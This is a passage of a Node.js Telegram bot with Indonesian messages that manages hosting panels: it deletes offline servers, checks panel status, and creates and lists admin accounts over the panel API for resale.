    await ctx.reply(caption, { reply_markup: inlineKeyboard, parse_mode: 'HTML' });
});

// -------------------- [ Action: Delete Server ] -------------------- \\
bot.action(/^DELSRVOFF:(.+)$/, async (ctx) => {
    const server = ctx.match[1];
    const userId = ctx.from.id.toString();
    
    if (!isAdminOrOwner(userId)) {
        return ctx.answerCbQuery("🚫 Tidak memiliki akses.");
    }

    const commandName = `delsrvoff${server}`;
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) {
        return ctx.answerCbQuery("❌ Limit telah habis!");
    }

    await ctx.answerCbQuery(`⏳ Memulai penghapusan server offline di ${server}...`);
    await ctx.editMessageText(`⏳ <b>Menghapus server offline di ${server}...</b>\n\n⏱️ Mohon tunggu sebentar...`, { parse_mode: 'HTML' });
    
    try {
        const result = await dellserveroff(ctx, server);
        
        const resultMessage = `
<blockquote>🖥️ <b>HASIL PENGHAPUSAN</b>
│• Total Ditemukan: ${result.total}
│• ✅ Berhasil: ${result.success}
│• ❌ Gagal: ${result.failed}

© AldzyIsHere</blockquote>`;

        await ctx.editMessageText(resultMessage, { parse_mode: 'HTML' });
        
    } catch (err) {
        console.error(`Error in DELSRVOFF ${server}:`, err);
        await ctx.editMessageText(`❌ <b>ERROR:</b> ${err.message}\n\nSilakan coba lagi.`, { parse_mode: 'HTML' });
    }
});

// -------------------- [ Action: Clear Server ] -------------------- \\
bot.action(/^CLEARSRVOFF:(.+)$/, async (ctx) => {
    const server = ctx.match[1];
    const userId = ctx.from.id.toString();
    
    if (!isAdminOrOwner(userId)) {
        return ctx.answerCbQuery("🚫 Tidak memiliki akses.");
    }

    const commandName = `clearsvroff${server}`;
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) {
        return ctx.answerCbQuery("❌ Limit telah habis!");
    }

    await ctx.answerCbQuery(`⏳ Memulai clear server offline dan user...`);
    await ctx.editMessageText(`⏳ <b>Memulai CLEAR OFFLINE ${server}...</b>\n\n⏱️ Proses akan memakan waktu 2-5 menit.`, { parse_mode: 'HTML' });
    
    try {
        await clearserveranduser(ctx, server);
    } catch (err) {
        console.error(`Error in CLEARSRVOFF ${server}:`, err);
        await ctx.reply(`❌ <b>FATAL ERROR:</b>\n<code>${err.message}</code>`, { parse_mode: 'HTML' });
    }
});

// -------------------- [ Command; Delete Srv ] -------------------- \\
const fefek = ['V1', 'V2', 'V3', 'V4', 'V5'];

fefek.forEach(server => {
    bot.command(`delsrvoff${server}`, async (ctx) => {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

        const commandName = `delsrvoff${server}`;
        const limitAllowed = await checkUserLimit(ctx, commandName);
        if (!limitAllowed) return;

        const processMsg = await ctx.reply(`⏳ <b>Menghapus server offline di ${server}...</b>\n\n⏱️ Mohon tunggu...`, { parse_mode: 'HTML' });
        
        try {
            const result = await dellserveroff(ctx, server);
            
            await ctx.telegram.deleteMessage(ctx.chat.id, processMsg.message_id).catch(() => {});
            
            const resultMessage = `
<blockquote>🖥️ <b>HASIL DELETE</b>
│• Total: ${result.total}
│• ✅ Berhasil: ${result.success}
│• ❌ Gagal: ${result.failed}

© AldzyIsHere</blockquote>`;

            await ctx.reply(resultMessage, { parse_mode: 'HTML' });
            
        } catch (err) {
            console.error(`Error in Delete ${server}:`, err);
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                processMsg.message_id,
                null,
                `❌ <b>ERROR:</b> ${err.message}`,
                { parse_mode: 'HTML' }
            );
        }
    });

    bot.command(`clearsvroff${server}`, async (ctx) => {
        const userId = ctx.from.id.toString();
        if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

        const commandName = `clearsvroff${server}`;
        const limitAllowed = await checkUserLimit(ctx, commandName);
        if (!limitAllowed) return;

        const processMsg = await ctx.reply(`⏳ <b>MEMULAI CLEAR ${server}...</b>\n⏱️ Proses akan memakan waktu 2-5 menit.`, { parse_mode: 'HTML' });
        
        try {
            await clearserveranduser(ctx, server);
            await ctx.telegram.deleteMessage(ctx.chat.id, processMsg.message_id).catch(() => {});
        } catch (err) {
            console.error(`Error in clearsvroff${server}:`, err);
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                processMsg.message_id,
                null,
                `❌ <b>FATAL ERROR:</b>\n<code>${err.message}</code>`,
                { parse_mode: 'HTML' }
            );
        }
    });
});

// -------------------- [ Command: Cek Panel Status ] --------------------
bot.command("cekpanel", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    // Cek limit
    const limitAllowed = await checkUserLimit(ctx, "cekpanel");
    if (!limitAllowed) return;

    // Cek premium
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const loadingMsg = await ctx.reply(
        `<blockquote>⏳ <b>Mengecek status panel...</b></blockquote>`,
        { parse_mode: "HTML" }
    );

    const servers = ["V1", "V2", "V3", "V4", "V5"];
    const results = [];
    let online = 0;
    let offline = 0;
    let totalServers = 0;
    let totalUsers = 0;

    for (const server of servers) {
        try {
            const config = getServerConfig(server);
            const { domain: serverDomain, apikey: serverApikey } = config;

            if (!serverDomain || !serverApikey || serverApikey === "-") {
                results.push({
                    server,
                    status: "❌ OFFLINE",
                    servers: 0,
                    users: 0,
                    details: "Domain/API tidak tersedia"
                });
                offline++;
                continue;
            }

            // Cek koneksi 
            const serverRes = await safeFetch(`${serverDomain}/api/application/servers?per_page=1`, {
                method: "GET",
                headers: getHeaders(serverApikey),
            }, 10000);

            if (!serverRes.ok) {
                results.push({
                    server,
                    status: "❌ OFFLINE",
                    servers: 0,
                    users: 0,
                    details: `HTTP ${serverRes.status} - ${serverRes.statusText}`
                });
                offline++;
                continue;
            }

            const serverData = await serverRes.json();
            
            // Ambil data users
            const userRes = await safeFetch(`${serverDomain}/api/application/users?per_page=1`, {
                method: "GET",
                headers: getHeaders(serverApikey),
            }, 10000);

            let userCount = 0;
            if (userRes.ok) {
                const userData = await userRes.json();
                userCount = userData.meta?.pagination?.total || 0;
            }

            const serverCount = serverData.meta?.pagination?.total || 0;
            totalServers += serverCount;
            totalUsers += userCount;

            results.push({
                server,
                status: "✅ ONLINE",
                servers: serverCount,
                users: userCount,
                details: `Domain/API Tersedia`
            });
            online++;

        } catch (error) {
            results.push({
                server,
                status: "❌ OFFLINE",
                servers: 0,
                users: 0,
                details: error.message.substring(0, 50)
            });
            offline++;
        }
    }

    // Format hasil
    let resultText = `<blockquote>📊 <b>STATUS PANEL</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    resultText += `📦 <b>Total Server Panel:</b> ${totalServers}\n`;
    resultText += `👥 <b>Total User Panel:</b> ${totalUsers}\n`;
    resultText += `━━━━━━━━━━━━━━━━━━━━━━</blockquote>\n`;

    results.forEach(r => {
        resultText += `<blockquote>`;
        resultText += `<b>${r.server}</b> ${r.status}\n`;
        resultText += `├ 📊 Server: ${r.servers}\n`;
        resultText += `├ 👤 User: ${r.users}\n`;
        resultText += `└ 🔗 ${r.details}`;
        resultText += `</blockquote>\n\n`;
    });

    resultText += `<blockquote>⏱️ <b>Last Check:</b> ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</blockquote>`;

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        resultText,
        { parse_mode: "HTML" }
    );
});

// -------------------- [ Command : Cadmin ] --------------------
bot.command("cadmin", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "cadminV1";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh: /cadmin username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh: /cadmin username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");

    // Validasi username
    if (!usernem || usernem.length < 3) {
        return ctx.reply("❌ Username minimal 3 karakter!");
    }

    // Validasi target ID 
    if (!targetID || targetID.length < 5) {
        return ctx.reply("❌ ID target tidak valid!");
    }

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = capital(usernem);
    const password = `${username}001`;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V1");

    try {
        await ctx.reply("⏳");

        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) {
            const errorMsg = data.errors[0]?.detail || JSON.stringify(data.errors[0]);
            return ctx.reply(`❌ Error: ${errorMsg}`);
        }

        const user = data.attributes;

        let successSent = false;
        const messageContent = `
<b>✅ Berhasil Membuat Admin Panel</b>

🔧 <b>Server:</b> V1
👤 <b>Username:</b> <code>${user.username}</code>
🔐 <b>Password:</b> <code>${password}</code>
📧 <b>Email:</b> <code>${email}</code>
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}

🌐 <b>Panel:</b> ${serverDomain}
<pre>Rules Pembelian Admin Panel:</pre>
- Masa aktif 30 hari  
- Data bersifat pribadi  
- Garansi 15 hari (1x replace)  
- Klaim wajib menyertakan bukti chat pembelian
────────────────────────────
© AldzyIsHere. `;

        try {
            await bot.telegram.sendPhoto(
                targetID,
                Photo(),
                {
                    caption: messageContent,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🌐 Login ke Panel V1", url: serverDomain }]
                        ]
                    }
                }
            );
            successSent = true;
        } catch (error) {
            console.log("Tidak bisa mengirim pesan ke target:", error);
            successSent = false;
        }

        if (successSent) {
            await ctx.reply(`
<blockquote><b>✅ BERHASIL MEMBUAT ADMIN PANEL V1</b></blockquote>

📡 <b>Server ID:</b> ${user.id}
👤 <b>Username:</b> ${user.username}
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}
👥 <b>Target ID:</b> ${targetID}

✅ <b>Data login telah dikirim ke private chat target</b>
────────────────────────────
© AldzyIsHere `,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        } else {
            await ctx.reply(`
❌ <b>Gagal mengirim data login ke private chat</b>
⚠️ Pastikan target sudah memulai chat dengan bot`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        }

    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat membuat akun admin panel V1: " + err.message);
    }
});

// -------------------- [ Command : CadminV2 ] --------------------
bot.command("cadminV2", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit 
    const commandName = "cadminV2";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh: /cadminV2 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh: /cadminV2 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");

    // Validasi username
    if (!usernem || usernem.length < 3) {
        return ctx.reply("❌ Username minimal 3 karakter!");
    }

    // Validasi target ID 
    if (!targetID || targetID.length < 5) {
        return ctx.reply("❌ ID target tidak valid!");
    }

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = capital(usernem);
    const password = `${username}001`;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V2");

    try {
        await ctx.reply("⏳");

        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) {
            const errorMsg = data.errors[0]?.detail || JSON.stringify(data.errors[0]);
            return ctx.reply(`❌ Error: ${errorMsg}`);
        }

        const user = data.attributes;

        let successSent = false;
        const messageContent = `
<b>✅ Berhasil Membuat Admin Panel</b>

🔧 <b>Server:</b> V2
👤 <b>Username:</b> <code>${user.username}</code>
🔐 <b>Password:</b> <code>${password}</code>
📧 <b>Email:</b> <code>${email}</code>
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}

🌐 <b>Panel:</b> ${serverDomain}
<pre>Rules Pembelian Admin Panel:</pre>
- Masa aktif 30 hari  
- Data bersifat pribadi  
- Garansi 15 hari (1x replace)  
- Klaim wajib menyertakan bukti chat pembelian
────────────────────────────
© AldzyIsHere. `;

        try {
            await bot.telegram.sendPhoto(
                targetID,
                Photo(),
                {
                    caption: messageContent,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🌐 Login ke Panel V2", url: serverDomain }]
                        ]
                    }
                }
            );
            successSent = true;
        } catch (error) {
            console.log("Tidak bisa mengirim pesan ke target:", error);
            successSent = false;
        }

        if (successSent) {
            await ctx.reply(`
<blockquote><b>✅ BERHASIL MEMBUAT ADMIN PANEL V2</b></blockquote>

📡 <b>Server ID:</b> ${user.id}
👤 <b>Username:</b> ${user.username}
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}
👥 <b>Target ID:</b> ${targetID}

✅ <b>Data login telah dikirim ke private chat target</b>
────────────────────────────
© AldzyIsHere `,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        } else {
            await ctx.reply(`
❌ <b>Gagal mengirim data login ke private chat</b>
⚠️ Pastikan target sudah memulai chat dengan bot`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        }

    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat membuat akun admin panel V2: " + err.message);
    }
});

// -------------------- [ Command : CadminV3 ] --------------------
bot.command("cadminV3", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "cadminV3";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh: /cadminV3 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh: /cadminV3 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");

    // Validasi username
    if (!usernem || usernem.length < 3) {
        return ctx.reply("❌ Username minimal 3 karakter!");
    }

    // Validasi target ID 
    if (!targetID || targetID.length < 5) {
        return ctx.reply("❌ ID target tidak valid!");
    }

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = capital(usernem);
    const password = `${username}001`;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V3");

    try {
        await ctx.reply("⏳");

        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) {
            const errorMsg = data.errors[0]?.detail || JSON.stringify(data.errors[0]);
            return ctx.reply(`❌ Error: ${errorMsg}`);
        }

        const user = data.attributes;

        let successSent = false;
        const messageContent = `
<b>✅ Berhasil Membuat Admin Panel</b>

📡 <b>Server ID:</b> ${user.id}
👤 <b>Username:</b> <code>${user.username}</code>
🔐 <b>Password:</b> <code>${password}</code>
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}

🌐 <b>Panel:</b> ${serverDomain}
<pre>Rules Pembelian Admin Panel:</pre>
- Masa aktif 30 hari  
- Data bersifat pribadi  
- Garansi 15 hari (1x replace)  
- Klaim wajib menyertakan bukti chat pembelian
────────────────────────────
© AldzyIsHere. `;

        try {
            await bot.telegram.sendPhoto(
                targetID,
                Photo(),
                {
                    caption: messageContent,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🌐 Login ke Panel V3", url: serverDomain }]
                        ]
                    }
                }
            );
            successSent = true;
        } catch (error) {
            console.log("Tidak bisa mengirim pesan ke target:", error);
            successSent = false;
        }

        if (successSent) {
            await ctx.reply(`
<blockquote><b>✅ BERHASIL MEMBUAT ADMIN PANEL V3</b></blockquote>

📡 <b>Server ID:</b> ${user.id}
👤 <b>Username:</b> ${user.username}
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}
👥 <b>Target ID:</b> ${targetID}

✅ <b>Data login telah dikirim ke private chat target</b>
────────────────────────────
© AldzyIsHere `,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        } else {
            await ctx.reply(`
❌ <b>Gagal mengirim data login ke private chat</b>
⚠️ Pastikan target sudah memulai chat dengan bot`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        }

    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat membuat akun admin panel V3: " + err.message);
    }
});

// -------------------- [ Command : CadminV4 ] --------------------
bot.command("cadminV4", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "cadminV4";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh: /cadminV4 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh: /cadminV4 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");

    // Validasi username
    if (!usernem || usernem.length < 3) {
        return ctx.reply("❌ Username minimal 3 karakter!");
    }

    // Validasi target ID 
    if (!targetID || targetID.length < 5) {
        return ctx.reply("❌ ID target tidak valid!");
    }

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = capital(usernem);
    const password = `${username}001`;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V4");

    try {
        await ctx.reply("⏳");

        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) {
            const errorMsg = data.errors[0]?.detail || JSON.stringify(data.errors[0]);
            return ctx.reply(`❌ Error: ${errorMsg}`);
        }

        const user = data.attributes;

        let successSent = false;
        const messageContent = `
<b>✅ Berhasil Membuat Admin Panel</b>

🔧 <b>Server:</b> V4
👤 <b>Username:</b> <code>${user.username}</code>
🔐 <b>Password:</b> <code>${password}</code>
📧 <b>Email:</b> <code>${email}</code>
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}

🌐 <b>Panel:</b> ${serverDomain}
<pre>Rules Pembelian Admin Panel:</pre>
- Masa aktif 30 hari  
- Data bersifat pribadi  
- Garansi 15 hari (1x replace)  
- Klaim wajib menyertakan bukti chat pembelian
────────────────────────────
© AldzyIsHere. `;

        try {
            await bot.telegram.sendPhoto(
                targetID,
                Photo(),
                {
                    caption: messageContent,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🌐 Login ke Panel V4", url: serverDomain }]
                        ]
                    }
                }
            );
            successSent = true;
        } catch (error) {
            console.log("Tidak bisa mengirim pesan ke target:", error);
            successSent = false;
        }

        if (successSent) {
            await ctx.reply(`
<blockquote><b>✅ BERHASIL MEMBUAT ADMIN PANEL V4</b></blockquote>

📡 <b>Server ID:</b> ${user.id}
👤 <b>Username:</b> ${user.username}
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}
👥 <b>Target ID:</b> ${targetID}

✅ <b>Data login telah dikirim ke private chat target</b>
────────────────────────────
© AldzyIsHere `,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        } else {
            await ctx.reply(`
❌ <b>Gagal mengirim data login ke private chat</b>
⚠️ Pastikan target sudah memulai chat dengan bot`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        }

    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat membuat akun admin panel V4: " + err.message);
    }
});

// -------------------- [ Command : CadminV5 ] --------------------
bot.command("cadminV5", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "cadminV5";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Contoh: /cadminV5 username,12345678");
    }

    const parts = text.split(",");
    if (parts.length < 2) {
        return ctx.reply("❌ Contoh: /cadminV5 username,12345678");
    }

    const [usernem, IDRaw] = parts.map(t => t.trim());
    const targetID = IDRaw.replace(/[^0-9]/g, "");

    // Validasi username
    if (!usernem || usernem.length < 3) {
        return ctx.reply("❌ Username minimal 3 karakter!");
    }

    // Validasi target ID 
    if (!targetID || targetID.length < 5) {
        return ctx.reply("❌ ID target tidak valid!");
    }

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = capital(usernem);
    const password = `${username}001`;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V5");

    try {
        await ctx.reply("⏳");

        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) {
            const errorMsg = data.errors[0]?.detail || JSON.stringify(data.errors[0]);
            return ctx.reply(`❌ Error: ${errorMsg}`);
        }

        const user = data.attributes;

        let successSent = false;
        const messageContent = `
<b>✅ Berhasil Membuat Admin Panel</b>

🔧 <b>Server:</b> V5
👤 <b>Username:</b> <code>${user.username}</code>
🔐 <b>Password:</b> <code>${password}</code>
📧 <b>Email:</b> <code>${email}</code>
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}

🌐 <b>Panel:</b> ${serverDomain}
<pre>Rules Pembelian Admin Panel:</pre>
- Masa aktif 30 hari  
- Data bersifat pribadi  
- Garansi 15 hari (1x replace)  
- Klaim wajib menyertakan bukti chat pembelian
────────────────────────────
© AldzyIsHere. `;

        try {
            await bot.telegram.sendPhoto(
                targetID,
                Photo(),
                {
                    caption: messageContent,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🌐 Login ke Panel V5", url: serverDomain }]
                        ]
                    }
                }
            );
            successSent = true;
        } catch (error) {
            console.log("Tidak bisa mengirim pesan ke target:", error);
            successSent = false;
        }

        if (successSent) {
            await ctx.reply(`
<blockquote><b>✅ BERHASIL MEMBUAT ADMIN PANEL V5</b></blockquote>

📡 <b>Server ID:</b> ${user.id}
👤 <b>Username:</b> ${user.username}
🗓️ <b>Tanggal Aktivasi:</b> ${tanggal(Date.now())}
👥 <b>Target ID:</b> ${targetID}

✅ <b>Data login telah dikirim ke private chat target</b>
────────────────────────────
© AldzyIsHere `,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        } else {
            await ctx.reply(`
❌ <b>Gagal mengirim data login ke private chat</b>
⚠️ Pastikan target sudah memulai chat dengan bot`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "─ Contact Owner", url: `https://t.me/${config.NameOwner?.replace('@', '') || 'ReyValdz'}` }]
                        ]
                    }
                });
        }

    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat membuat akun admin panel V5: " + err.message);
    }
});

// -------------------- [ Command : DelAdmin Panel V1 ] --------------------
bot.command("deladminp", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deladminpV1";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V1");

    try {
        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            }
        });

        const data = await res.json();
        const users = data.data;
        const adminUsers = users.filter(u => u.attributes.root_admin === true);

        if (adminUsers.length < 1) return ctx.reply("⚠️ Tidak ada admin panel di V1.");

        const buttons = adminUsers.map((admin) => [
            { text: `🧩 ${admin.attributes.first_name} | ID:${admin.attributes.id}`, callback_data: `DELADMIN:${admin.attributes.id}:V1` }
        ]);

        await ctx.reply(
            `<b>(🧩) Pilih admin panel V1 yang ingin dihapus</b>

📊 <b>Total Admin Panel:</b> ${adminUsers.length}
⚠️ <i>Hati-hati, tindakan ini tidak dapat dibatalkan!</i>
────────────────────────────
© AldzyIsHere`,
            {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: buttons }
            }
        );
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data admin panel V1.");
    }
});

// -------------------- [ Command : DelAdmin Panel V2 ] --------------------
bot.command("deladminpV2", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deladminpV2";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V2");

    try {
        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            }
        });

        const data = await res.json();
        const users = data.data;
        const adminUsers = users.filter(u => u.attributes.root_admin === true);

        if (adminUsers.length < 1) return ctx.reply("⚠️ Tidak ada admin panel di V2.");

        const buttons = adminUsers.map((admin) => [
            { text: `🧩 ${admin.attributes.first_name} | ID:${admin.attributes.id}`, callback_data: `DELADMIN:${admin.attributes.id}:V2` }
        ]);

        await ctx.reply(
            `<b>(🧩) Pilih admin panel V2 yang ingin dihapus</b>

📊 <b>Total Admin Panel:</b> ${adminUsers.length}
⚠️ <i>Hati-hati, tindakan ini tidak dapat dibatalkan!</i>
────────────────────────────
© AldzyIsHere`,
            {
                parse_mode: "HTML",
                reply_markup: { inline_keyboard: buttons }
            }
        );
    } catch (err) {
        console.error(err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data admin panel V2.");
    }
});

// -------------------- [ Command : DelAdmin Panel V3 ] --------------------
bot.command("deladminpV3", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deladminpV3";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V3");

    try {
        const res = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`
            }
        });

        const data = await res.json();
        const users = data.data;
        const adminUsers = users.filter(u => u.attributes.root_admin === true);

        if (adminUsers.length < 1) return ctx.reply("⚠️ Tidak ada admin panel di V3.");

        const buttons = adminUsers.map((admin) => [
            { text: `🧩 ${admin.attributes.first_name} | ID:${admin.attributes.id}`, callback_data: `DELADMIN:${admin.attributes.id}:V3` }
        ]);

        await ctx.reply(
            `<b>(🧩) Pilih admin panel V3 yang ingin dihapus</b>

📊 <b>Total Admin Panel:</b> ${adminUsers.length}
